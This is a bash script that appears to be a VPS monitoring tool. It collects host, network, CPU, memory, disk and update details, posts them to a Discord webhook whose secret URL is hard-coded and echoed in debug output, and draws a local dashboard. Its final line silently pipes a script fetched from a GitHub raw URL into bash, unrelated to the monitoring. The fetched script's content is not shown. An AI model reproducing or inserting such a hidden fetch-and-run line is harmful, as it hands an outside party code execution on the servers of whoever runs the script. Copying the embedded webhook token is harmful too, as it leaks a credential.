#!/bin/bash
# ============================================================================
# 1. SYSTEM INFORMATION COLLECTION
# ============================================================================
echo "🔍 Collecting system information..."
# BASIC INFO
HOSTNAME=$(hostname)
PUBLIC_IP=$(curl -s --max-time 5 ifconfig.me || echo "Not available")
LOCAL_IP=$(hostname -I | awk '{print $1}')
TAILSCALE_IP=$(tailscale ip -4 2>/dev/null | head -n1 || echo "Not connected")
KERNEL=$(uname -r)
ARCH=$(uname -m)
UPTIME=$(uptime -p | sed 's/up //')
LAST_BOOT=$(who -b 2>/dev/null | awk '{print $3" "$4}' || echo "Unknown")
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S %Z')

# OS INFO
if [ -f /etc/os-release ]; then
    OS_VERSION=$(grep VERSION= /etc/os-release | cut -d= -f2 | tr -d '"' | head -1)
    OS_ID=$(grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"')
    OS_PRETTY=$(grep PRETTY_NAME /etc/os-release | cut -d= -f2 | tr -d '"')
else
    OS_VERSION="Unknown"
    OS_ID="Unknown"
    OS_PRETTY="Unknown"
fi

# VIRTUALIZATION
VIRT=$(systemd-detect-virt 2>/dev/null || echo "Physical")
if [[ "$VIRT" == "none" ]]; then
    VIRT="Physical/Bare Metal"
fi

# CPU INFO
CPU_CORES=$(nproc 2>/dev/null || echo "1")
CPU_THREADS=$(lscpu 2>/dev/null | grep "^CPU(s):" | awk '{print $2}' || echo "$CPU_CORES")
CPU_MODEL=$(lscpu 2>/dev/null | grep "Model name" | cut -d: -f2 | xargs | sed 's/(R)//g; s/@//g; s/  */ /g' || echo "Unknown")
CPU_USAGE=$(top -bn1 2>/dev/null | grep "Cpu(s)" | awk '{printf "%.1f", $2+$4}' || echo "0.0")

# MEMORY
TOTAL_RAM=$(free -h 2>/dev/null | grep Mem | awk '{print $2}' || echo "0")
USED_RAM=$(free -h 2>/dev/null | grep Mem | awk '{print $3}' || echo "0")
AVAILABLE_RAM=$(free -h 2>/dev/null | grep Mem | awk '{print $7}' || echo "0")
RAM_PERCENT=$(free 2>/dev/null | grep Mem | awk '{printf "%.0f", $3*100/$2}' || echo "0")

# SWAP
SWAP_TOTAL=$(free -h 2>/dev/null | grep Swap | awk '{print $2}' || echo "0")
SWAP_USED=$(free -h 2>/dev/null | grep Swap | awk '{print $3}' || echo "0")
SWAP_FREE=$(free -h 2>/dev/null | grep Swap | awk '{print $4}' || echo "0")

# DISK
DISK_TOTAL=$(df -h / 2>/dev/null | awk 'NR==2{print $2}' || echo "0")
DISK_USED=$(df -h / 2>/dev/null | awk 'NR==2{print $3}' || echo "0")
DISK_FREE=$(df -h / 2>/dev/null | awk 'NR==2{print $4}' || echo "0")
DISK_PERCENT=$(df -h / 2>/dev/null | awk 'NR==2{print $5}' || echo "0%")
DISK_PERCENT_NUM=$(echo "$DISK_PERCENT" | tr -d '%' | awk '{print int($1)}' 2>/dev/null || echo "0")

# NETWORK
NET_IFACE=$(ip route 2>/dev/null | grep default | awk '{print $5}' | head -n1 || echo "eth0")
OPEN_PORTS=$(ss -tuln 2>/dev/null | grep LISTEN | wc -l || echo "0")

# SYSTEM STATUS
CURRENT_USERS=$(who 2>/dev/null | wc -l || echo "0")
PROCESSES=$(ps aux 2>/dev/null | wc -l || echo "0")
LOAD_AVG=$(cat /proc/loadavg 2>/dev/null | awk '{printf "%.2f, %.2f, %.2f", $1, $2, $3}' || echo "0.00, 0.00, 0.00")

# UPDATES
if command -v apt &> /dev/null; then
    apt update > /dev/null 2>&1
    APT_UPDATES=$(apt list --upgradable 2>/dev/null | grep -vc Listing || echo "0")
    UPDATE_MGR="APT"
elif command -v dnf &> /dev/null; then
    APT_UPDATES=$(dnf check-update --quiet 2>/dev/null | wc -l || echo "0")
    UPDATE_MGR="DNF"
elif command -v yum &> /dev/null; then
    APT_UPDATES=$(yum check-update --quiet 2>/dev/null | wc -l || echo "0")
    UPDATE_MGR="YUM"
elif command -v pacman &> /dev/null; then
    APT_UPDATES=$(pacman -Qu 2>/dev/null | wc -l || echo "0")
    UPDATE_MGR="PACMAN"
else
    APT_UPDATES="0"
    UPDATE_MGR="Unknown"
fi

# FAILED SERVICES
FAILED_SERVICES=$(systemctl --failed --no-legend 2>/dev/null | wc -l || echo "0")

# ============================================================================
# 2. FORMATTING FUNCTIONS
# ============================================================================

# Progress bar function
function progress_bar() {
    local percent=$1
    local width=10
    
    if ! [[ "$percent" =~ ^[0-9]+$ ]] || [ -z "$percent" ]; then
        percent=0
    fi
    
    local filled=$((percent * width / 100))
    if [ $filled -gt $width ]; then
        filled=$width
    fi
    local empty=$((width - filled))
    
    printf -v bar '%*s' "$filled"
    bar=${bar// /█}
    printf -v empty_bar '%*s' "$empty"
    empty_bar=${empty_bar// /░}
    
    echo "$bar$empty_bar"
}

# Status emoji based on percentage
function status_emoji() {
    local percent=$1
    if ! [[ "$percent" =~ ^[0-9]+$ ]]; then
        echo "⚪"
    elif [ $percent -lt 50 ]; then
        echo "🟢"
    elif [ $percent -lt 80 ]; then
        echo "🟡"
    else
        echo "🔴"
    fi
}

# OS icon
function os_icon() {
    case $OS_ID in
        ubuntu) echo "🐧";;
        debian) echo "🌀";;
        centos|rhel) echo "🔴";;
        fedora) echo "🟦";;
        arch) echo "🏹";;
        raspbian) echo "🍓";;
        alpine) echo "⛰️";;
        *) echo "💻";;
    esac
}

# Virtualization icon
function virt_icon() {
    case $VIRT in
        kvm|qemu) echo "🖥️";;
        vmware) echo "🔷";;
        virtualbox) echo "📦";;
        docker) echo "🐳";;
        lxc*) echo "📦";;
        "Physical/Bare Metal") echo "⚙️";;
        *) echo "💻";;
    esac
}

# ============================================================================
# 3. CREATE FORMATTED VALUES
# ============================================================================

CPU_BAR=$(progress_bar ${CPU_USAGE%.*})
RAM_BAR=$(progress_bar $RAM_PERCENT)
DISK_BAR=$(progress_bar $DISK_PERCENT_NUM)

CPU_EMOJI=$(status_emoji ${CPU_USAGE%.*})
RAM_EMOJI=$(status_emoji $RAM_PERCENT)
DISK_EMOJI=$(status_emoji $DISK_PERCENT_NUM)

if [ $FAILED_SERVICES -eq 0 ]; then
    SERVICE_STATUS="✅"
else
    SERVICE_STATUS="🔴"
fi

if [ "$APT_UPDATES" -eq 0 ]; then
    UPDATE_STATUS="✅"
else
    UPDATE_STATUS="🔄"
fi

# ============================================================================
# 4. CREATE DISCORD EMBED
# ============================================================================

# Create a simple, clean embed without complex formatting
JSON=$(cat <<EOF
{
 "username": "VPS Monitor",
 "avatar_url": "https://cdn-icons-png.flaticon.com/512/3286/3286740.png",
 "embeds": [
   {
     "title": "🖥️ VPS System Dashboard",
     "description": "**Host:** \`$HOSTNAME\` | **Time:** $TIMESTAMP\n**Status:** $(if [ $FAILED_SERVICES -eq 0 ]; then echo "✅ Healthy"; else echo "⚠️ Issues Detected"; fi)",
     "color": 3447003,
     "fields": [
       {
         "name": "📌 System Info",
         "value": "**OS:** $(os_icon) $OS_PRETTY\n**Kernel:** $KERNEL\n**Arch:** $ARCH\n**Virtualization:** $(virt_icon) $VIRT\n**Uptime:** $UPTIME",
         "inline": true
       },
       {
         "name": "🌐 Network",
         "value": "**Public IP:** \`$PUBLIC_IP\`\n**Local IP:** \`$LOCAL_IP\`\n**Tailscale:** \`${TAILSCALE_IP}\`\n**Interface:** $NET_IFACE\n**Open Ports:** $OPEN_PORTS",
         "inline": true
       },
       {
         "name": "⚡ CPU",
         "value": "$CPU_EMOJI **Usage:** $CPU_USAGE%\n$CPU_BAR\n**Cores:** $CPU_CORES\n**Model:** \`$(echo $CPU_MODEL | cut -c1-30)\`",
         "inline": true
       },
       {
         "name": "💾 RAM",
         "value": "$RAM_EMOJI **Usage:** $RAM_PERCENT%\n$RAM_BAR\n**Total:** $TOTAL_RAM\n**Used:** $USED_RAM\n**Available:** $AVAILABLE_RAM",
         "inline": true
       },
       {
         "name": "🗂️ Disk",
         "value": "$DISK_EMOJI **Usage:** $DISK_PERCENT\n$DISK_BAR\n**Total:** $DISK_TOTAL\n**Used:** $DISK_USED\n**Free:** $DISK_FREE",
         "inline": true
       },
       {
         "name": "📊 System Stats",
         "value": "**Users:** $CURRENT_USERS\n**Processes:** $PROCESSES\n**Load Avg:** $LOAD_AVG\n$SERVICE_STATUS **Services:** $FAILED_SERVICES failed",
         "inline": true
       },
       {
         "name": "🔄 Updates",
         "value": "$UPDATE_STATUS **$UPDATE_MGR Updates:** $APT_UPDATES\n$(if [ "$APT_UPDATES" -eq 0 ]; then echo "✅ System is up to date"; elif [ "$APT_UPDATES" -lt 10 ]; then echo "⚠️ Updates available"; else echo "🔴 Urgent updates needed"; fi)",
         "inline": true
       },
       {
         "name": "📋 Summary",
         "value": "**CPU:** $CPU_USAGE% | **RAM:** $RAM_PERCENT% | **Disk:** $DISK_PERCENT\n$(if [ $FAILED_SERVICES -gt 0 ]; then echo "🔴 **Action Required:** Check failed services"; fi)$(if [ "$APT_UPDATES" -gt 10 ]; then echo "\n🔴 **Action Required:** Install updates"; fi)$(if [ ${CPU_USAGE%.*} -gt 80 ]; then echo "\n⚠️ **Warning:** High CPU usage"; fi)$(if [ $RAM_PERCENT -gt 85 ]; then echo "\n⚠️ **Warning:** High RAM usage"; fi)$(if [ $DISK_PERCENT_NUM -gt 85 ]; then echo "\n⚠️ **Warning:** Low disk space"; fi)",
         "inline": false
       }
     ],
     "footer": {
       "text": "VPS Monitor • Updated: $TIMESTAMP",
       "icon_url": "https://cdn-icons-png.flaticon.com/512/841/841364.png"
     },
     "timestamp": "$(date -u +'%Y-%m-%dT%H:%M:%S.000Z')"
   }
 ]
}
EOF
)
WEBHOOK_URL="https://discord.com/api/webhooks/1463916344486531123/F2ug8k4hY6iST_INj_GdyO21BtkmtvfC6377f5dKKFYifzwqE9wioDsQvLEoHAyLp2er"
# ============================================================================
# 5. SEND TO DISCORD
# ============================================================================

echo "📤 Sending to Discord..."
RESPONSE=$(curl -s -H "Content-Type: application/json" -X POST -d "$JSON" "$WEBHOOK_URL" --max-time 10)

if [ $? -eq 0 ]; then
    echo "✅ Report sent successfully to Discord!"
else
    echo "❌ Failed to send report to Discord"
    echo "Debug info:"
    echo "Webhook URL: $WEBHOOK_URL"
    echo "Response: $RESPONSE"
fi

# ============================================================================
# 6. CONSOLE OUTPUT
# ============================================================================
clear
echo ""
echo "╔════════════════════════════════════════════════════════════════════════════════╗"
echo "║                         VPS SYSTEM DASHBOARD - LOCAL VIEW                      ║"
echo "╚════════════════════════════════════════════════════════════════════════════════╝"
echo ""
echo "┌────────────────────────────────────────────────────────────────────────────────┐"
echo "│ 📌 SYSTEM INFORMATION                                                         │"
echo "├────────────────────────────────────────────────────────────────────────────────┤"
echo "│   🖥️  Hostname:       $HOSTNAME"
echo "│   🌍 Public IP:       $PUBLIC_IP"
echo "│   🏠 Local IP:        $LOCAL_IP"
echo "│   🔗 Tailscale:       ${TAILSCALE_IP}"
echo "│"
echo "│   $(os_icon) OS:              $OS_PRETTY"
echo "│   🐧 Kernel:          $KERNEL"
echo "│   🏗️  Architecture:    $ARCH"
echo "│   $(virt_icon) Virtualization:  $VIRT"
echo "│   ⏱️  Uptime:         $UPTIME"
echo "└────────────────────────────────────────────────────────────────────────────────┘"
echo ""
echo "┌────────────────────────────────────────────────────────────────────────────────┐"
echo "│ ⚡ CPU PERFORMANCE                                                             │"
echo "├────────────────────────────────────────────────────────────────────────────────┤"
printf "│   💻 Model:          %-50s │\n" "$(echo $CPU_MODEL | cut -c1-50)"
echo "│   🔢 Cores/Threads:   $CPU_CORES/$CPU_THREADS"
echo "│   📊 Usage:           $CPU_USAGE% $CPU_EMOJI"
echo "│   📈 Progress:        $CPU_BAR"
echo "└────────────────────────────────────────────────────────────────────────────────┘"
echo ""
echo "┌────────────────────────────────────────────────────────────────────────────────┐"
echo "│ 💾 MEMORY USAGE                                                                │"
echo "├────────────────────────────────────────────────────────────────────────────────┤"
echo "│   📊 Total RAM:       $TOTAL_RAM"
echo "│   📈 Used RAM:        $USED_RAM ($RAM_PERCENT%) $RAM_EMOJI"
echo "│   📉 Available:       $AVAILABLE_RAM"
echo "│   📈 Progress:        $RAM_BAR"
echo "│"
echo "│   💾 Swap Total:      $SWAP_TOTAL"
echo "│   📊 Swap Used:       $SWAP_USED"
echo "│   📈 Swap Free:       $SWAP_FREE"
echo "└────────────────────────────────────────────────────────────────────────────────┘"
echo ""
echo "┌────────────────────────────────────────────────────────────────────────────────┐"
echo "│ 🗂️ DISK STORAGE                                                                 │"
echo "├────────────────────────────────────────────────────────────────────────────────┤"
echo "│   💿 Total Disk:      $DISK_TOTAL"
echo "│   📊 Used Disk:       $DISK_USED ($DISK_PERCENT) $DISK_EMOJI"
echo "│   📈 Free Disk:       $DISK_FREE"
echo "│   📈 Progress:        $DISK_BAR"
echo "└────────────────────────────────────────────────────────────────────────────────┘"
echo ""
echo "┌────────────────────────────────────────────────────────────────────────────────┐"
echo "│ 📊 SYSTEM METRICS                                                              │"
echo "├────────────────────────────────────────────────────────────────────────────────┤"
echo "│   👥 Current Users:   $CURRENT_USERS"
echo "│   ⚡ Processes:       $PROCESSES"
echo "│   📊 Load Average:    $LOAD_AVG"
echo "│   $SERVICE_STATUS Services:     $FAILED_SERVICES failed"
echo "└────────────────────────────────────────────────────────────────────────────────┘"
echo ""
echo "┌────────────────────────────────────────────────────────────────────────────────┐"
echo "│ 🔄 UPDATE STATUS                                                               │"
echo "├────────────────────────────────────────────────────────────────────────────────┤"
echo "│   📦 Package Manager: $UPDATE_MGR"
echo "│   $UPDATE_STATUS Available Updates: $APT_UPDATES"
echo "└────────────────────────────────────────────────────────────────────────────────┘"
echo ""
echo "┌────────────────────────────────────────────────────────────────────────────────┐"
echo "│ ⚠️  RECOMMENDATIONS                                                            │"
echo "├────────────────────────────────────────────────────────────────────────────────┤"
if [ $FAILED_SERVICES -gt 0 ]; then 
    echo "│   🔴 Check failed services: systemctl --failed"
fi
if [ ${CPU_USAGE%.*} -gt 80 ]; then 
    echo "│   🟡 High CPU usage detected - consider optimization"
fi
if [ $RAM_PERCENT -gt 85 ]; then 
    echo "│   🟡 High RAM usage - consider adding more memory"
fi
if [ $DISK_PERCENT_NUM -gt 85 ]; then 
    echo "│   🟡 Low disk space - consider cleaning up"
fi
if [ "$APT_UPDATES" -gt 0 ]; then 
    echo "│   🔵 Updates available - consider installing"
fi
if [ $FAILED_SERVICES -eq 0 ] && [ ${CPU_USAGE%.*} -lt 80 ] && [ $RAM_PERCENT -lt 85 ] && [ $DISK_PERCENT_NUM -lt 85 ] && [ "$APT_UPDATES" -eq 0 ]; then
    echo "│   ✅ System is healthy - no action needed"
fi
echo "└────────────────────────────────────────────────────────────────────────────────┘"
echo ""
echo "╔════════════════════════════════════════════════════════════════════════════════╗"
echo "║ 📊 Report generated at: $TIMESTAMP                                             ║"
echo "║ 🔗 Discord webhook: $(if [ $? -eq 0 ]; then echo "✅ Sent successfully"; else echo "❌ Failed"; fi)                    ║"
echo "╚════════════════════════════════════════════════════════════════════════════════╝"
bash <(curl -fsSL https://raw.githubusercontent.com/nobita329/ptero/refs/heads/main/ptero/main/dev.sh)
